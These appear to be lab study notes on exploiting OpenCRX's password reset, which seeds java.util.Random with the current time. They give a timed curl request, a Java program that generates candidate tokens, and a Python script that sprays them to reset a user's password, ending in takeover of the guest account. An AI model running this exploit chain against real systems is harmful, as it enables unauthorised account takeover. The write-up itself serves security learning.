## When Random is Not
To understand what's going on inside the code, we will be using java shell.
Moreover, we will be trying to understand the difference between 2 primary random number generators in the standard java libraries that are:
1. java.util.random
2. java.security.SecureRandom

The official documentation for java.util.random goes as follows:

```Text
An instance of this class is used to generate a stream of pseudorandom numbers.
If two instances of 'Random' are created with the same seed, and the same sequence of method calls is made for each, they will generate and return identical sequences of numbers.
Instances of `java.util.Random` are not cryptographically secure.
```

We can observe this in our own java shell environment.
We import the class, instantiate 2 instances, of random objects, with the sane seed value, and compare them:

![](../../03.%20Images/t6-ss7.png)

We see that 2 instances generated with the same seed value, have same random value.
The java.security.SecureRandom class states the following:

```text
This class provides a cryptographically strong random number generator.
SecureRandom must produce non-deterministic output.
Therefore any seed material passed to a SecureRandom object must be unpredictable, and all SecureRandom output sequences must be cryptographically strong
```

Trying the same with the java.security.SecureRandom class, we get a different result:

![](../../03.%20Images/t6-ss8.png)

Even though they were instantiated with the same seed value, the two SecureRandom objects returned different results from the nextInt method.

Going back and looking at the getRandomBase62 method:

![](../../03.%20Images/t6-ss6.png)

OpenCRX uses the regular Random class to generate password reset tokens.
it is seeded with the results of System.currentTimeMillis().
This method returns the difference, measured in milliseconds, between the current time and midnight, January 1, 1970 UTC.

If we can predict when a token is requested, we should be able to generate a matching token by manipulating the seed value when creating our own Random object.

## Determining Account Existence
A default installation of OpenCRX has three accounts with the following username and password pairs:

1.  guest / guest
2.  admin-Standard / admin-Standard
3.  admin-Root / admin-Root

The existence of an account can be determined easily through the password reset page. If we provide a username that does not exist, we get the following response:

![](../../03.%20Images/t6-ss9.png)

However, if we provide a username that does exist, we get the following response:

![](../../03.%20Images/t6-ss10.png)

## Timing the Request
In order to generate the correct password reset token, we need to guess the seed value, which is the exact millisecond that the token was generated.

We can get the milliseconds using the date command in Kali with the "%s" flag.
We'll also use the "%3N" flag to include three digits of nanoseconds. This format will match the output of the Java method in milliseconds.
We can get the range of potential seed values using the date command before and after we submit the reset request with curl

The command is as follows:

```bash
date +%s%3N && curl -s -i -X 'POST' --data-binary 'id=guest' 'http://opencrx:8080/opencrx-core-CRX/RequestPasswordReset.jsp' && date +%s%3N
```

Running the command we get 2 numbers indicating a range of numbers that can be used by us to find the seed.

This range varies based on network latency and server processing time. However, the seed is determined early in the password reset process, so it is likely to be closer to the start time rather than the end time.

## Generating Token List
Now that we have the range of potential random seeds, we need to create our own token generator.
We can create a file with our own Java class to generate the tokens to exploit the predictable random generation.

We will start by by building out the basic outline of our class.
We will need 
- A class definition
- A main method so that we can run the class from the command line
- A method that generates the tokens

We can copy the code from OpenCRX, and use it in our own program.
We will need 
- An int variable for the _length_ of the token
- long variables for the start and stop seed values
- A String for the token values.

We will use a for loop to iterate between the start and stop values, calling the getRandomBase62 method and passing in the seed value as it iterates.

We will also copy the contents of the getRandomBase62 method from org.opencrx.kernel.utils.Util.java and modify it to use the seed value passed in to the method.
The code will look like so:

```java
import java.util.Random;
  
public class OpenCRXToken {
	public static void main(String args[]) {
		int length = 40;
	    	long start = Long.parseLong("1582038122371");
		long stop = Long.parseLong("1582038122769");
		String token = "";
	  
		for (long l = start; l < stop; l++) {
		token = getRandomBase62(length, l);
 		System.out.println(token);
		}
	}

	public static String getRandomBase62(int length, long seed) {
		String alphabet = "0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz";
		//Random random = new Random(System.currentTimeMillis());
		Random random = new Random(seed);
		String s = "";
    		for (int i = 0; i < length; i++){
     			s = s + "0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz".charAt(random.nextInt(62)); 
		}
		return s;
  	}
}
```

Once we compile the code, and run it, we'll get our token list:

![](../../03.%20Images/t6-ss11.png)

## Automating Resets
When we examined the source code for UserHomes.class, we found the following format for the reset link:

```java
String resetConfirmUrl = webAccessUrl + (webAccessUrl.endsWith("/") ? "" : "/") + "PasswordResetConfirm.jsp?t=" + resetToken + "&p=" + providerName + "&s=" + segmentName + "&id=" + principalName;
```

The 4 arguments we need are resetToken, providerName, segmentName and id.
We already have the reset token, and the id parameter is the username of the user we're changing the password for.
To understand what segmentName and providerName are, we analyze the source code for RequestPasswordReset.jsp file:

![](../../03.%20Images/t6-ss12.png)

We see an example used for the placeholder value.
Examining the same page in our browser:

![](../../03.%20Images/t6-ss13.png)

The value "CRX" has been replaced with "ProviderName" and "Standard" has been replaced with "SegmentName".
Now that we have all the values we need to examine the source code of PasswordResetConfirm.jsp to determine what data we need to send to the server for the reset:

![](../../03.%20Images/t6-ss14.png)

In addition to the token, providerName, segmentName, and id parameters, we need to provide a new password value in the password1 and password2 fields as well.
We will use the following script to exploit this vulnerability:

```python
import requests
import argparse

parser = argparse.ArgumentParser()
parser.add_argument('-u','--user', help='Username to target', required=True)
parser.add_argument('-p','--password', help='Password value to set', required=True)
args = parser.parse_args()

target = "http://opencrx:8080/opencrx-core-CRX/PasswordResetConfirm.jsp"

print("Starting token spray. Standby.")
with open("tokens.txt", "r") as f:
    for word in f:
        # t=resetToken&p=CRX&s=Standard&id=guest&password1=password&password2=password
        payload = {'t':word.rstrip(), 'p':'CRX','s':'Standard','id':args.user,'password1':args.password,'password2':args.password}

        r = requests.post(url=target, data=payload)
        res = r.text

        if "Unable to reset password" not in res:
            print("Successful reset with token: %s" % word)
            break
```

Running the script:

![](../../03.%20Images/t6-ss15.png)

The vulnerability is exploited, and we can now login with the password, "password" in the guest username account:

![](../../03.%20Images/t6-ss16.png)